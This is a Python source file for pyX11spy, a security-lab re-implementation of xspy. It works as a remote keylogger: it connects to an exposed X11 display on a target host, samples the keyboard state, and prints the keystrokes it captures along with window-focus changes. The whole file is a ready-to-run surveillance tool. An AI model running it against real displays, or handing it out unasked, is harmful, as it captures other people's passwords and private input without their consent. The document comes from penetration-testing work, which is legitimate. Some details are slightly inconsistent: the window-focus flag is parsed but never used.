#!/usr/bin/python3

from collections import defaultdict
from Xlib import display, protocol, X, XK
import argparse
import string
import sys
import time

description = '''

            by David E. Baker of K logix Security's Scorpion Labs

pyX11spy is a Python-based re-implementation of the xspy tool, which captures
keystrokes sent to an open X Display System. Like its source of inspiration,
pyX11spy uses the X11 XQueryKeymap method to periodically sample the state of
a keyboard attached to a remote display. The differences between the current
state and the previously queried state are then compared to determine which
keys have been pressed and which keys have been released. This has the
potential to create a large amount of network traffic (the default sample rate
is 100,000 queries per second, meaning at least 100,000 packets per second)
but this can be tuned on the command line by specifying a new sample rate to
the -s or --sample_delay option.

Too high of a sample rate and too much network traffic is created; too low of
a sample rate and keystrokes may be missed.

Characters that don't have an ASCII-printable representation, such as the
escape key, are represented inside single brackets: i.e., [Escape]. To
eliminate any potential for confusion, if the actual open- or close-bracket key
is struck, it is repeated: i.e., [[ or ]]. Since special key symbols only
appear wrapped with one bracket and the keystroke itself appears with two,
there should be no confusion as to the series of keystrokes actually used. In a
similar manner, if -p or --print_up is specified, pyX11spy will print when
keys are released (in the event they are held down). In this case, the release
will be indicated by the key surrounded by parens, i.e. (w) to indicate that
'w' was released. To eliminate any potential for confusion here, if the open- or
close-parens key (exists and) is struck then the output is repeated, i.e. (( or
)).

pyX11spy also comes with the nifty option to monitor window focus as well. If
this option (-w or --window_focus) then pyX11spy will also report changes in
window focus by window ID and window name, allowing the caller to see what
window keystrokes are being delivered to.

See the following for more information:
https://github.com/mnp/xspy/blob/master/xspy.c
https://www.klogixsecurity.com/scorpion-labs-blog/

'''

def get_bit(key_array, index):
    return key_array[index // 8] & (1 << (index % 8))

def buildKeycodeDictionary(remoteDisplay):

    keysyms = dict()

    # Get all of the key symbols for printable characters
    for entry in string.printable[0:62]:
        keysyms[entry] = XK.string_to_keysym(entry)

    # Printable characters not identified by the character they print
    keysyms[' '] = XK.string_to_keysym("space")
    keysyms['!'] = XK.string_to_keysym("exclam")
    keysyms['"'] = XK.string_to_keysym("quotedbl")
    keysyms['#'] = XK.string_to_keysym("numbersign")
    keysyms['$'] = XK.string_to_keysym("dollar")
    keysyms['%'] = XK.string_to_keysym("percent")
    keysyms['&'] = XK.string_to_keysym("ampersand")
    keysyms["'"] = XK.string_to_keysym("apostrophe")
    keysyms['(('] = XK.string_to_keysym("parenleft")
    keysyms['))'] = XK.string_to_keysym("parenright")
    keysyms['*'] = XK.string_to_keysym("asterisk")
    keysyms['+'] = XK.string_to_keysym("plus")
    keysyms[','] = XK.string_to_keysym("comma")
    keysyms['-'] = XK.string_to_keysym("minus")
    keysyms['.'] = XK.string_to_keysym("period")
    keysyms['/'] = XK.string_to_keysym("slash")
    keysyms[';'] = XK.string_to_keysym("semicolon")
    keysyms['<'] = XK.string_to_keysym("less")
    keysyms['='] = XK.string_to_keysym("equal")
    keysyms['>'] = XK.string_to_keysym("greater")
    keysyms['?'] = XK.string_to_keysym("question")
    keysyms['@'] = XK.string_to_keysym("at")
    keysyms['[['] = XK.string_to_keysym("bracketleft")
    keysyms['\\'] = XK.string_to_keysym("backslash")
    keysyms[']]'] = XK.string_to_keysym("bracketright")
    keysyms['^'] = XK.string_to_keysym("asciicircum")
    keysyms['_'] = XK.string_to_keysym("underscore")
    keysyms['`'] = XK.string_to_keysym("grave")
    keysyms['{'] = XK.string_to_keysym("braceleft")
    keysyms['|'] = XK.string_to_keysym("bar")
    keysyms['}'] = XK.string_to_keysym("braceright")
    keysyms['~'] = XK.string_to_keysym("asciitilde")

    # "Long" keys that aren't represented by printable ASCII characters
    keysyms['[Control_L]'] = XK.string_to_keysym("Control_L")
    keysyms['[Control_R]'] = XK.string_to_keysym("Control_R")
    keysyms['[Alt_L]'] = XK.string_to_keysym("Alt_L")
    keysyms['[Alt_R]'] = XK.string_to_keysym("Alt_R")
    keysyms['[Shift_L]'] = XK.string_to_keysym("Shift_L")
    keysyms['[Shift_R]'] = XK.string_to_keysym("Shift_R")
    keysyms['[Caps_Lock]'] = XK.string_to_keysym("Caps_Lock")
    keysyms['[Tab]'] = XK.string_to_keysym("Tab")
    keysyms['[Escape]'] = XK.string_to_keysym("Escape")
    keysyms['[Backspace]'] = XK.string_to_keysym("BackSpace")
    keysyms['[LineFeed]'] = XK.string_to_keysym("Linefeed")
    keysyms['[Return]'] = XK.string_to_keysym("Return")

    # Should be self-explanatory
    keysyms['[F1]'] = XK.string_to_keysym("F1")
    keysyms['[F2]'] = XK.string_to_keysym("F2")
    keysyms['[F3]'] = XK.string_to_keysym("F3")
    keysyms['[F4]'] = XK.string_to_keysym("F4")
    keysyms['[F5]'] = XK.string_to_keysym("F5")
    keysyms['[F6]'] = XK.string_to_keysym("F6")
    keysyms['[F7]'] = XK.string_to_keysym("F7")
    keysyms['[F8]'] = XK.string_to_keysym("F8")
    keysyms['[F9]'] = XK.string_to_keysym("F9")
    keysyms['[F10]'] = XK.string_to_keysym("F10")
    keysyms['[F11]'] = XK.string_to_keysym("F11")
    keysyms['[F12]'] = XK.string_to_keysym("F12")

    # Directional arrow keys
    keysyms['[Up]'] = XK.string_to_keysym("Up")
    keysyms['[Left]'] = XK.string_to_keysym("Left")
    keysyms['[Right]'] = XK.string_to_keysym("Right")
    keysyms['[Down]'] = XK.string_to_keysym("Down")

    # Keys that are above the directional arrow keys on most keyboards
    keysyms['[Insert]'] = XK.string_to_keysym("Insert")
    keysyms['[Delete]'] = XK.string_to_keysym("Delete")
    keysyms['[Home]'] = XK.string_to_keysym("Home")
    keysyms['[End]'] = XK.string_to_keysym("End")
    keysyms['[PageUp]'] = XK.string_to_keysym("Page_Up")
    keysyms['[PageDown]'] = XK.string_to_keysym("Page_Down")
    
    # The keys on and around the number-pad
    keysyms['[KeyPad0]'] = XK.string_to_keysym("KP_0")
    keysyms['[KeyPad1]'] = XK.string_to_keysym("KP_1")
    keysyms['[KeyPad2]'] = XK.string_to_keysym("KP_2")
    keysyms['[KeyPad3]'] = XK.string_to_keysym("KP_3")
    keysyms['[KeyPad4]'] = XK.string_to_keysym("KP_4")
    keysyms['[KeyPad5]'] = XK.string_to_keysym("KP_5")
    keysyms['[KeyPad6]'] = XK.string_to_keysym("KP_6")
    keysyms['[KeyPad7]'] = XK.string_to_keysym("KP_7")
    keysyms['[KeyPad8]'] = XK.string_to_keysym("KP_8")
    keysyms['[KeyPad9]'] = XK.string_to_keysym("KP_9")
    keysyms['[KeyPadPlus]'] = XK.string_to_keysym("KP_Add")
    keysyms['[KeyPadMinus]'] = XK.string_to_keysym("KP_Subtract")
    keysyms['[KeyPadMultiply]'] = XK.string_to_keysym("KP_Multiply")
    keysyms['[KeyPadDivide]'] = XK.string_to_keysym("KP_Divide")
    keysyms['[KeyPadEnter]'] = XK.string_to_keysym("KP_Enter")
    keysyms['[KeyPadComma]'] = XK.string_to_keysym("KP_Comma")
    keysyms['[KeyPadPeriod]'] = XK.string_to_keysym("KP_Period")
    keysyms['[KeyPadPlusMinus]'] = XK.string_to_keysym("KP_MinPlus")

    # Get all of the remote key codes corresponding to monitored symbols
    keycodes = dict()
    for entry in list(keysyms.keys()):
        keycodes[entry] = remoteDisplay.keysym_to_keycode(keysyms[entry])

    # Get an inverse correlation of key codes to the way they'll be represented
    keychars = defaultdict(list)
    for key, value in keycodes.items():
        keychars[value].append(key)

    return keycodes, keychars

def captureKeystrokes(remoteDisplay, print_up, flush_delay, sample_delay):
    # Initialize some variables
    keycodes, keychars = buildKeycodeDictionary(remoteDisplay)
    focus = previous_focus = remoteDisplay.get_input_focus().focus
    last_print_time = time.time()
    previous_keys = ([0] * 32)

    print("[+] Beginning collect on " + remoteDisplay.get_display_name())
    if (focus.get_wm_name()):
        print("\n[" + hex(focus.id) + " " + focus.get_wm_name() + "]")
    else:
        print("\n[" + hex(focus.id) + " No Window Title]")

    # Sync up and get started!
    remoteDisplay.sync()

    while True:

        # Monitor for and display changes in focus
        focus = remoteDisplay.get_input_focus().focus
        if (focus.id != previous_focus.id):
            if (focus.get_wm_name()):
                print("\n\n[" + hex(focus.id) + " " + focus.get_wm_name() + "]")
            else:
                print("\n\n[" + hex(focus.id) + " No Window Title]")
            last_print_time = time.time()
            previous_focus = focus

        # Monitor and display changes in keyboard state
        keys = remoteDisplay.query_keymap()
        for index in range(0, 32 * 8):
            try:
                if (get_bit(keys, index) != get_bit(previous_keys, index)):
                    if (get_bit(keys, index) != 0):
                        print(keychars[index][0], end = "")
                    elif (print_up):
                        print("(" + keychars[index][0] + ")", end = "")
            except:
                print("[-] Key code " + str(index) + " currently unsupported.")
        previous_keys = keys

        # Keep some time-resiliency in flushing stdout
        if (time.time() - last_print_time >= flush_delay):
            sys.stdout.flush()
            last_print_time = time.time()
            
        # Always invoke the sample delay for the simple sake of sanity
        time.sleep(sample_delay)

    return 0

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t",
        "--target",
        default = "localhost",
        help = "target URL or IP address to capture from (default = localhost)"
    )
    parser.add_argument(
        "-d",
        "--display",
        default = "0",
        help = "display number to capture from (default = 0)"
    )
    parser.add_argument(
        "-f",
        "--flush_delay",
        type = float,
        default = 2.0,
        help = "seconds between flushes of stdout to screen (default = 2.0s)"
    )
    parser.add_argument(
        "-s",
        "--sample_delay",
        type = float,
        default = 0.00001,
        help = "seconds between polls of remote keyboard (default = 0.00001s)"
    )
    parser.add_argument(
        "-p",
        "--print_up",
        action = "store_true",
        help = "print when keys are released (indicated by parens)"
    )
    parser.add_argument(
        "-w",
        "--window_focus",
        action = "store_true",
        default = False,
        help = "display changes in remote display's window focus"
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action = "store_true",
        default = False,
        help = "increase output verbosity (currently not implemented)"
    )
    args = parser.parse_args()

    captureKeystrokes(
        display.Display(args.target + ":" + args.display),
        args.print_up,
        args.flush_delay,
        args.sample_delay
    )

    return 0

if __name__ == '__main__':
    main()

